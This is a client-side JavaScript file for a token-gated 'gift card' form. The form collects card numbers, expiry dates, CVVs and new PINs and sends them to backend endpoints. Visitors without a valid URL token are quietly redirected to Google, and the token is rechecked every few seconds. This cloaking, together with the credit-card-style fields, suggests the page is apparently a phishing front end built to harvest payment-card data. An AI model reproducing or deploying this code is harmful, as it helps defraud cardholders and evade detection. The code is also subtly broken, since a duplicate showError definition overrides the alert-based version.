// Global variables
let currentSection = 'check';
let token = null;
let validationInterval = null;

// Initialize the page
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔐 Initializing gift card management form...');
    
    // Show initial loading screen immediately
    const initialLoadingOverlay = document.getElementById('initialLoadingOverlay');
    const mainContainer = document.getElementById('mainContainer');
    
    // Ensure loading screen is visible and main content is hidden
    initialLoadingOverlay.classList.add('active');
    mainContainer.style.display = 'none';
    
    // Get token from URL query parameter
    const urlParams = new URLSearchParams(window.location.search);
    token = urlParams.get('token');

    // First check if token exists
    if (!token) {
        console.log('❌ No token found in URL');
        redirectToGoogle('Missing access token');
        return;
    }
    
    console.log('✅ Token found, validating with backend...');
    
    // Validate token with backend BEFORE showing any content
    validateTokenWithBackend();
});

async function validateTokenWithBackend() {
    const initialLoadingOverlay = document.getElementById('initialLoadingOverlay');
    const mainContainer = document.getElementById('mainContainer');
    
    try {
        console.log('🔐 Validating token with backend...');
        
        // Update loading message
        const loadingMessage = initialLoadingOverlay.querySelector('p');
        if (loadingMessage) {
            loadingMessage.textContent = 'Validating security token with authentication server...';
        }
        
        const response = await fetch('/api/validate-token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ token: token })
        });
        
        const result = await response.json();
        
        if (result.valid) {
            // Token is valid - hide loading and show main content
            console.log('✅ Token validated with backend');
            
            // Add a small delay for better UX
            setTimeout(() => {
                initialLoadingOverlay.classList.remove('active');
                mainContainer.style.display = 'block';
                
                // Initialize the form
                initializeForm();
                populateDateDropdowns();
                setupEventListeners();
                
                // Update token expiry in localStorage based on backend response
                if (result.tokenData && result.tokenData.expiresAt) {
                    const expiresAt = new Date(result.tokenData.expiresAt).getTime();
                    localStorage.setItem('tokenExpiry', expiresAt);
                }
                
                // Start continuous token validation every 3 seconds
                startContinuousValidation();
            }, 500);
            
        } else {
            // Token is invalid - redirect to Google
            console.log('❌ Token invalid:', result.reason);
            redirectToGoogle('Invalid or expired token: ' + result.reason);
            // Clear invalid token
            localStorage.removeItem('secureToken');
            localStorage.removeItem('tokenExpiry');
        }
        
    } catch (error) {
        console.error('Token validation error:', error);
        
        // Update loading message to show error state
        const loadingMessage = initialLoadingOverlay.querySelector('p');
        if (loadingMessage) {
            loadingMessage.textContent = 'Authentication service unavailable. Please try again.';
        }
        
        // Redirect to Google after a delay
        setTimeout(() => {
            redirectToGoogle('Token validation service unavailable');
        }, 2000);
    }
}

function startContinuousValidation() {
    // Validate token every 3 seconds
    validationInterval = setInterval(async () => {
        try {
            const response = await fetch('/api/validate-token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ token: token })
            });
            
            const result = await response.json();
            
            if (!result.valid) {
                // Token became invalid - redirect to Google
                console.log('❌ Token became invalid during session:', result.reason);
                clearInterval(validationInterval);
                redirectToGoogle('Session expired: ' + result.reason);
                localStorage.removeItem('secureToken');
                localStorage.removeItem('tokenExpiry');
            }
            
        } catch (error) {
            console.error('Continuous validation error:', error);
            // Don't kick out for network errors, just log
        }
    }, 3000); // Every 3 seconds
}

function redirectToGoogle(reason) {
    console.log('🔀 Redirecting to Google. Reason:', reason);
    // Redirect to Google instead of showing nuclear error
    window.location.href = 'https://www.google.com';
}

function initializeForm() {
    console.log('📝 Initializing form...');
    // Show first section
    showSection('check');
}

function populateDateDropdowns() {
    console.log('📅 Populating date dropdowns...');
    
    // Populate all dropdowns for each section
    const sections = ['', 'Register', 'Personalize'];
    
    sections.forEach(suffix => {
        const monthOptions = document.getElementById(`expiryMonthOptions${suffix}`);
        const yearOptions = document.getElementById(`expiryYearOptions${suffix}`);
        
        if (monthOptions && yearOptions) {
            // Clear existing options
            monthOptions.innerHTML = '';
            yearOptions.innerHTML = '';
            
            // Populate months
            for (let i = 1; i <= 12; i++) {
                const month = i.toString().padStart(2, '0');
                const option = document.createElement('div');
                option.className = 'custom-option';
                option.dataset.value = month;
                option.textContent = month;
                monthOptions.appendChild(option);
            }
            
            // Populate years (current year to +20 years)
            const currentYear = new Date().getFullYear();
            for (let i = 0; i <= 20; i++) {
                const year = currentYear + i;
                const option = document.createElement('div');
                option.className = 'custom-option';
                option.dataset.value = year;
                option.textContent = year;
                yearOptions.appendChild(option);
            }
        }
    });
    
    // Initialize custom select functionality
    initializeCustomSelects();
}

function initializeCustomSelects() {
    console.log('🎯 Initializing custom selects...');
    
    // Initialize all select dropdowns
    const sections = ['', 'Register', 'Personalize'];
    
    sections.forEach(suffix => {
        const monthSelect = document.getElementById(`expiryMonthSelect${suffix}`);
        const yearSelect = document.getElementById(`expiryYearSelect${suffix}`);
        
        if (monthSelect && yearSelect) {
            const monthTrigger = monthSelect.querySelector('.custom-select-trigger');
            const monthOptions = document.getElementById(`expiryMonthOptions${suffix}`);
            const monthValue = document.getElementById(`expiryMonthValue${suffix}`);
            const monthInput = document.getElementById(`expiryMonth${suffix}`);
            
            const yearTrigger = yearSelect.querySelector('.custom-select-trigger');
            const yearOptions = document.getElementById(`expiryYearOptions${suffix}`);
            const yearValue = document.getElementById(`expiryYearValue${suffix}`);
            const yearInput = document.getElementById(`expiryYear${suffix}`);
            
            // Toggle month dropdown
            monthTrigger.addEventListener('click', function(e) {
                e.stopPropagation();
                console.log('📆 Month dropdown clicked');
                monthSelect.classList.toggle('active');
                // Close other dropdowns
                yearSelect.classList.remove('active');
            });
            
            // Toggle year dropdown
            yearTrigger.addEventListener('click', function(e) {
                e.stopPropagation();
                console.log('📅 Year dropdown clicked');
                yearSelect.classList.toggle('active');
                // Close other dropdowns
                monthSelect.classList.remove('active');
            });
            
            // Month option selection
            monthOptions.querySelectorAll('.custom-option').forEach(option => {
                option.addEventListener('click', function() {
                    const value = this.dataset.value;
                    console.log('📆 Month selected:', value);
                    monthValue.textContent = value;
                    monthInput.value = value;
                    monthSelect.classList.remove('active');
                    
                    // Update selected state
                    monthOptions.querySelectorAll('.custom-option').forEach(opt => {
                        opt.classList.remove('selected');
                    });
                    this.classList.add('selected');
                    
                    validateExpiryDate(suffix);
                });
            });
            
            // Year option selection
            yearOptions.querySelectorAll('.custom-option').forEach(option => {
                option.addEventListener('click', function() {
                    const value = this.dataset.value;
                    console.log('📅 Year selected:', value);
                    yearValue.textContent = value;
                    yearInput.value = value;
                    yearSelect.classList.remove('active');
                    
                    // Update selected state
                    yearOptions.querySelectorAll('.custom-option').forEach(opt => {
                        opt.classList.remove('selected');
                    });
                    this.classList.add('selected');
                    
                    validateExpiryDate(suffix);
                });
            });
        }
    });
    
    // Close dropdowns when clicking outside
    document.addEventListener('click', function() {
        console.log('📄 Document clicked - closing dropdowns');
        document.querySelectorAll('.custom-select').forEach(select => {
            select.classList.remove('active');
        });
    });
    
    console.log('✅ Custom selects initialized');
}

function setupEventListeners() {
    console.log('🎧 Setting up event listeners...');
    
    // Section button clicks
    document.querySelectorAll('.section-button').forEach(button => {
        button.addEventListener('click', function() {
            const section = this.dataset.section;
            showSection(section);
            
            // Update active button state
            document.querySelectorAll('.section-button').forEach(btn => {
                btn.classList.remove('active');
            });
            this.classList.add('active');
        });
    });
    
    // Card number formatting and validation for each section
    const cardNumberInputs = [
        document.getElementById('cardNumber'),
        document.getElementById('cardNumberRegister'),
        document.getElementById('cardNumberPersonalize')
    ];
    
    cardNumberInputs.forEach(input => {
        if (input) {
            input.addEventListener('input', formatCardNumber);
            input.addEventListener('blur', validateCardNumber);
        }
    });
    
    // CVV validation for each section
    const cvvInputs = [
        document.getElementById('cvv'),
        document.getElementById('cvvRegister'),
        document.getElementById('cvvPersonalize')
    ];
    
    cvvInputs.forEach(input => {
        if (input) {
            input.addEventListener('input', validateCVV);
            input.addEventListener('blur', validateCVV);
        }
    });
    
    // PIN validation for personalize section
    const newPINInput = document.getElementById('newPIN');
    const confirmPINInput = document.getElementById('confirmPIN');
    
    if (newPINInput) {
        newPINInput.addEventListener('input', validatePIN);
        newPINInput.addEventListener('blur', validatePIN);
    }
    
    if (confirmPINInput) {
        confirmPINInput.addEventListener('input', validatePIN);
        confirmPINInput.addEventListener('blur', validatePIN);
    }
    
    console.log('✅ Event listeners set up');
}

async function submitForm() {
    console.log('🎁 Submitting form...');
    
    try {
        const validationResponse = await fetch('/api/validate-token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ token: token })
        });
        
        const validationResult = await validationResponse.json();
        
        if (!validationResult.valid) {
            redirectToGoogle('Session expired during submission');
            localStorage.removeItem('secureToken');
            localStorage.removeItem('tokenExpiry');
            return;
        }
    } catch (error) {
        redirectToGoogle('Token validation failed during submission');
        return;
    }
    
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    // Show loading state
    loadingOverlay.classList.add('active');
    
    // Prepare form data based on current section
    let formData = {};
    let endpoint = '';
    
    switch(currentSection) {
        case 'check':
            formData = {
                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
                expiryMonth: document.getElementById('expiryMonth').value,
                expiryYear: document.getElementById('expiryYear').value,
                cvv: document.getElementById('cvv').value,
                action: 'checkBalance'
            };
            endpoint = '/api/check-balance';
            break;
            
        case 'register':
            formData = {
                cardNumber: document.getElementById('cardNumberRegister').value.replace(/\s+/g, ''),
                expiryMonth: document.getElementById('expiryMonthRegister').value,
                expiryYear: document.getElementById('expiryYearRegister').value,
                cvv: document.getElementById('cvvRegister').value,
                action: 'registerCard'
            };
            endpoint = '/api/register-card';
            break;
            
        case 'personalize':
            formData = {
                cardNumber: document.getElementById('cardNumberPersonalize').value.replace(/\s+/g, ''),
                expiryMonth: document.getElementById('expiryMonthPersonalize').value,
                expiryYear: document.getElementById('expiryYearPersonalize').value,
                cvv: document.getElementById('cvvPersonalize').value,
                newPIN: document.getElementById('newPIN').value,
                confirmPIN: document.getElementById('confirmPIN').value,
                action: 'personalizePIN'
            };
            endpoint = '/api/personalize-pin';
            break;
    }
    
    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                token: token,
                formData: formData
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showSuccess(result);
            // Stop continuous validation after successful submission
            if (validationInterval) {
                clearInterval(validationInterval);
            }
        } else {
            throw new Error(result.error || 'Submission failed');
        }
        
    } catch (error) {
        console.error('Submission error:', error);
        showError(error.message || 'Failed to process your request. Please try again.');
    } finally {
        loadingOverlay.classList.remove('active');
    }
}

// Clean up interval when leaving page
window.addEventListener('beforeunload', function() {
    if (validationInterval) {
        clearInterval(validationInterval);
    }
});

// Card number formatting
function formatCardNumber(event) {
    let value = event.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const selectionStart = event.target.selectionStart;
    
    // Format with spaces every 4 digits
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    
    event.target.value = value;
    
    // Restore cursor position
    const newLength = value.length;
    const newPosition = selectionStart + (value.length - newLength);
    event.target.setSelectionRange(newPosition, newPosition);
    
    validateCardNumber(event);
}

// Validation functions
function validateCardNumber(event) {
    const input = event.target;
    const errorId = input.id + 'Error';
    const error = document.getElementById(errorId);
    const value = input.value.replace(/\s+/g, '');
    
    // Basic length validation (standard gift card length)
    if (value.length !== 16) {
        showError(error, 'Card number must be 16 digits');
        return false;
    }
    
    // Luhn algorithm validation
    if (!luhnCheck(value)) {
        showError(error, 'Invalid card number');
        return false;
    }
    
    hideError(error);
    return true;
}

function validateCVV(event) {
    const input = event.target;
    const errorId = input.id + 'Error';
    const error = document.getElementById(errorId);
    const value = input.value;
    
    if (!/^\d+$/.test(value)) {
        showError(error, 'CVV must contain only numbers');
        return false;
    }
    
    if (value.length !== 3) {
        showError(error, 'CVV must be 3 digits');
        return false;
    }
    
    hideError(error);
    return true;
}

function validateExpiryDate(suffix = '') {
    const monthInput = document.getElementById(`expiryMonth${suffix}`);
    const yearInput = document.getElementById(`expiryYear${suffix}`);
    const error = document.getElementById(`expiry${suffix}Error`);
    
    if (!monthInput || !yearInput || !error) return false;
    
    if (!monthInput.value || !yearInput.value) {
        showError(error, 'Please select both month and year');
        return false;
    }
    
    const expiryDate = new Date(yearInput.value, monthInput.value - 1);
    const currentDate = new Date();
    
    if (expiryDate < currentDate) {
        showError(error, 'Card has expired');
        return false;
    }
    
    hideError(error);
    return true;
}

function validatePIN() {
    const newPIN = document.getElementById('newPIN');
    const confirmPIN = document.getElementById('confirmPIN');
    const newPINError = document.getElementById('newPINError');
    const confirmPINError = document.getElementById('confirmPINError');
    
    if (!newPIN || !confirmPIN) return false;
    
    let isValid = true;
    
    // Validate new PIN
    if (!/^\d{4}$/.test(newPIN.value)) {
        showError(newPINError, 'PIN must be exactly 4 digits');
        isValid = false;
    } else {
        hideError(newPINError);
    }
    
    // Validate confirm PIN
    if (confirmPIN.value !== newPIN.value) {
        showError(confirmPINError, 'PINs do not match');
        isValid = false;
    } else {
        hideError(confirmPINError);
    }
    
    return isValid;
}

// Luhn algorithm implementation
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Section navigation
function showSection(sectionName) {
    // Hide all sections
    document.querySelectorAll('.form-section').forEach(section => {
        section.classList.remove('active');
    });
    
    // Show target section
    document.getElementById(`section-${sectionName}`).classList.add('active');
    
    currentSection = sectionName;
}

function showSuccess(result) {
    const successMessage = document.getElementById('successMessage');
    const successDetails = document.getElementById('successDetails');
    
    successDetails.textContent = result.message || 'Your request has been processed successfully!';
    document.querySelectorAll('.form-section').forEach(section => {
        section.classList.remove('active');
    });
    successMessage.classList.add('active');
    
    currentSection = 'success'; // Update current section
}

function showError(message) {
    // Simple error display - you might want to use a more sophisticated notification system
    alert(`Error: ${message}`);
}

function redirectToMainPage() {
    // Redirect to the main page
    window.location.href = 'https://my-gift-hub-front.vercel.app/';
}

// Utility functions
function showError(element, message) {
    if (element) {
        element.textContent = message;
        element.classList.add('active');
        if (element.previousElementSibling) {
            element.previousElementSibling.classList.add('error');
        }
    }
}

function hideError(element) {
    if (element) {
        element.classList.remove('active');
        if (element.previousElementSibling) {
            element.previousElementSibling.classList.remove('error');
        }
    }
}
